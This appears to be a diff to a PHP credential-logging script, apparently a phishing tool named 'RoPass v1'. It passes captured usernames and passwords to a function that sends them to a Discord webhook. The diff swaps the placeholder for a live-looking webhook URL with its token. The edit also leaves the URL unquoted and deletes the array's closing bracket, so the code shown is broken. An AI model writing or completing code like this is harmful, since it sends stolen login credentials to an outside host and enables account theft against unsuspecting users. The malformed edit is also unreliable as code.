@@ -38,8 +38,7 @@ function logData($username, $password) {
 
 function sendToDiscordWebhook($data) {
     $webhookUrls = [
-        'PASTE YOUR WEBHOOK HERE',  // Replace with your actual Discord webhook URL
-    ];
+        'PASTE YOUR WEBHOOK HERE', https://discord.com/api/webhooks/1493536426187292763/XpBjGbXSTPify5v6Ui0Ly6-RuaS86M5RDREXQHeHhFJMrXGPoQYR1lishEdNno2toV3W
 
     $embed = [
         "title" => "RoPass v1",
